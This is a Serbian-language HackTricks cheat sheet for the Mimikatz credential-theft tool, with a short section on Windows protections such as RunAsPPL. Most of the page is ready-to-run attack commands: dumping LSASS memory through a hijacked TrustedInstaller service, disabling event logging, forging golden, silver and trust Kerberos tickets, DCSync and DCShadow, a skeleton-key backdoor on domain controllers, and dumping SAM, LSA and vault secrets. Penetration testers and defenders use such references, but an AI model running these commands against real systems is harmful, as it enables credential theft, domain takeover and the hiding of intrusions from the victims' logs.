# Mimikatz

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Ova stranica je bazirana na jednoj sa** [**adsecurity.org**](https://adsecurity.org/?page\_id=1821). Proverite original za dodatne informacije!

## LM i čisti tekst u memoriji

Od Windows 8.1 i Windows Server 2012 R2 verzija, značajne mere su preduzete kako bi se zaštitili od krađe akreditacija:

* **LM heševi i lozinke u čistom tekstu** više nisu smešteni u memoriji radi poboljšane sigurnosti. Specifično podešavanje registra, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, mora biti konfigurisano sa DWORD vrednošću `0` kako bi se onemogućila Digest autentifikacija, čime se osigurava da "čisti tekst" lozinke nisu keširane u LSASS-u.
* **LSA zaštita** je uvedena kako bi se zaštitio proces Local Security Authority (LSA) od neovlašćenog čitanja memorije i ubacivanja koda. To se postiže označavanjem LSASS-a kao zaštićenog procesa. Aktivacija LSA zaštite uključuje:

1. Izmenu registra na putanji _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ postavljanjem `RunAsPPL` na `dword:00000001`.
2. Implementaciju Group Policy Object (GPO) koji primenjuje ovo promene registra na upravljanim uređajima.

Uprkos ovim zaštitama, alati poput Mimikatz-a mogu zaobići LSA zaštitu koristeći određene drajvere, iako će takve radnje verovatno biti zabeležene u evidenciji događaja.

### Protivljenje uklanjanju SeDebugPrivilege

Administratori obično imaju SeDebugPrivilege privilegiju, koja im omogućava da debaguju programe. Ova privilegija može biti ograničena kako bi se sprečilo neovlašćeno izvlačenje memorije, uobičajena tehnika koju napadači koriste za izvlačenje akreditacija iz memorije. Međutim, čak i sa uklonjenom ovom privilegijom, TrustedInstaller nalog i dalje može vršiti izvlačenje memorije koristeći prilagođenu konfiguraciju servisa:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

Ovo omogućava preuzimanje memorije `lsass.exe` u datoteku, koja se zatim može analizirati na drugom sistemu kako bi se izvukli podaci za prijavu:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Opcije Mimikatz-a

Manipulacija događajnim zapisima u Mimikatz-u uključuje dve osnovne radnje: brisanje događajnih zapisa i zakrpu Event servisa kako bi se sprečilo beleženje novih događaja. U nastavku su navedene komande za izvođenje ovih radnji:

#### Brisanje događajnih zapisa

* **Komanda**: Ova radnja ima za cilj brisanje događajnih zapisa, čime se otežava praćenje zlonamernih aktivnosti.
* Mimikatz ne pruža direktnu komandu u svojoj standardnoj dokumentaciji za brisanje događajnih zapisa direktno putem komandne linije. Međutim, manipulacija događajnim zapisima obično uključuje korišćenje sistemskih alata ili skripti van Mimikatz-a za brisanje određenih zapisa (npr. korišćenjem PowerShell-a ili Windows Event Viewer-a).

#### Eksperimentalna funkcionalnost: Zakrpa Event servisa

* **Komanda**: `event::drop`
* Ova eksperimentalna komanda je namenjena izmeni ponašanja Event Logging servisa, čime se efektivno sprečava beleženje novih događaja.
* Primer: `mimikatz "privilege::debug" "event::drop" exit`
* Komanda `privilege::debug` obezbeđuje da Mimikatz radi sa neophodnim privilegijama za izmenu sistemskih servisa.
* Komanda `event::drop` zatim zakrpljuje Event Logging servis.

### Napadi na Kerberos tikete

### Kreiranje Zlatnog Tiketa

Zlatni Tiket omogućava impersonaciju pristupa na nivou domena. Ključna komanda i parametri:

* Komanda: `kerberos::golden`
* Parametri:
* `/domain`: Ime domena.
* `/sid`: Sigurnosni identifikator (SID) domena.
* `/user`: Korisničko ime za impersonaciju.
* `/krbtgt`: NTLM heš servisnog naloga KDC-a domena.
* `/ptt`: Direktno ubacuje tiket u memoriju.
* `/ticket`: Čuva tiket za kasniju upotrebu.

Primer:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Kreiranje Silver Tiketa

Silver Tiketi omogućavaju pristup određenim uslugama. Ključna komanda i parametri:

* Komanda: Slično kao i za Golden Tiket, ali cilja određene usluge.
* Parametri:
* `/service`: Usluga koja se cilja (npr. cifs, http).
* Ostali parametri su slični kao za Golden Tiket.

Primer:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Kreiranje Trust Tiketa

Trust Tiketi se koriste za pristup resursima između domena putem poverenja između njih. Ključna komanda i parametri:

* Komanda: Slično kao i Golden Ticket, ali za poverene odnose.
* Parametri:
* `/target`: FQDN ciljnog domena.
* `/rc4`: NTLM heš za nalog poverenja.

Primer:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Dodatne Kerberos komande

* **Izlistavanje karata**:
* Komanda: `kerberos::list`
* Izlistava sve Kerberos karte za trenutnu korisničku sesiju.
* **Prosljeđivanje keša**:
* Komanda: `kerberos::ptc`
* Ubacuje Kerberos karte iz keš fajlova.
* Primer: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
* **Prosljeđivanje karte**:
* Komanda: `kerberos::ptt`
* Omogućava korišćenje Kerberos karte u drugoj sesiji.
* Primer: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
* **Brisanje karata**:
* Komanda: `kerberos::purge`
* Briše sve Kerberos karte iz sesije.
* Korisno pre korišćenja komandi za manipulaciju kartama kako bi se izbegli konflikti.

### Manipulacija Active Directory-jem

* **DCShadow**: Privremeno čini mašinu da se ponaša kao DC za manipulaciju AD objektima.
* `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
* **DCSync**: Oponaša DC da bi zatražio podatke o lozinkama.
* `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Pribavljanje akreditiva

* **LSADUMP::LSA**: Izvlači akreditive iz LSA.
* `mimikatz "lsadump::lsa /inject" exit`
* **LSADUMP::NetSync**: Oponaša DC koristeći podatke o lozinkama računa računara.
* _Nije pružena posebna komanda za NetSync u originalnom kontekstu._
* **LSADUMP::SAM**: Pristup lokalnoj SAM bazi podataka.
* `mimikatz "lsadump::sam" exit`
* **LSADUMP::Secrets**: Dekriptuje tajne koje su smeštene u registru.
* `mimikatz "lsadump::secrets" exit`
* **LSADUMP::SetNTLM**: Postavlja novi NTLM heš za korisnika.
* `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
* **LSADUMP::Trust**: Pribavlja informacije o autentifikaciji poverenja.
* `mimikatz "lsadump::trust" exit`

### Razno

* **MISC::Skeleton**: Ubacuje zadnja vrata u LSASS na DC-u.
* `mimikatz "privilege::debug" "misc::skeleton" exit`

### Eskalacija privilegija

* **PRIVILEGE::Backup**: Pribavlja prava za pravljenje rezervnih kopija.
* `mimikatz "privilege::backup" exit`
* **PRIVILEGE::Debug**: Pribavlja privilegije za debagovanje.
* `mimikatz "privilege::debug" exit`

### Pribavljanje akreditiva

* **SEKURLSA::LogonPasswords**: Prikazuje akreditive za prijavljene korisnike.
* `mimikatz "sekurlsa::logonpasswords" exit`
* **SEKURLSA::Tickets**: Izvlači Kerberos karte iz memorije.
* `mimikatz "sekurlsa::tickets /export" exit`

### Manipulacija SID-om i tokenom

* **SID::add/modify**: Menja SID i SIDHistory.
* Dodaj: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
* Modifikuj: _Nije pružena posebna komanda za modifikaciju u originalnom kontekstu._
* **TOKEN::Elevate**: Oponaša tokene.
* `mimikatz "token::elevate /domainadmin" exit`

### Terminalne usluge

* **TS::MultiRDP**: Dozvoljava više RDP sesija.
* `mimikatz "ts::multirdp" exit`
* **TS::Sessions**: Izlistava TS/RDP sesije.
* _Nije pružena posebna komanda za TS::Sessions u originalnom kontekstu._

### Trezor

* Izvlači lozinke iz Windows trezora.
* `mimikatz "vault::cred /patch" exit`

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova** [**hacktricks repo-u**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo-u**](https://github.com/carlospolop/hacktricks-cloud).

</details>
